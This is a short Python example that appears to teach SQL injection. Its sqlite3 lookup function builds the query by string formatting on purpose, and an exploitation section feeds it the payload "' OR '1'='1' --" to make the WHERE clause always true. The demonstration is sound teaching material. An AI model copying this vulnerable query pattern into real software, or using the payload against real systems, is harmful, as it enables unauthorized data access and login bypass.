import sqlite3

def get_user_status_vulnerable(username):
    conn = sqlite3.connect('example.db')
    cursor = conn.cursor()

    # Vulnerability: Direct string formatting of user input
    query = "SELECT status FROM users WHERE username = '%s'" % username
    
    print(f"Executing query: {query}") # For demonstration
    try:
        cursor.execute(query)
        result = cursor.fetchone()
        if result:
            return result[0]
        else:
            return "User not found"
    except sqlite3.Error as e:
        return f"Database error: {e}"
    finally:
        conn.close()

# --- Exploitation Example ---

# Normal, intended use
normal_user_status = get_user_status_vulnerable("john_doe")
print(f"John Doe's status: {normal_user_status}")

# Malicious input to bypass logic (e.g., in a login check where status might mean 'admin')
malicious_input = "' OR '1'='1' --" 
# The full query becomes: SELECT status FROM users WHERE username = '' OR '1'='1' --'
# The '--' comments out the rest of the query, making the WHERE clause always true.
admin_status_bypass = get_user_status_vulnerable(malicious_input)
print(f"Status with malicious input: {admin_status_bypass}")
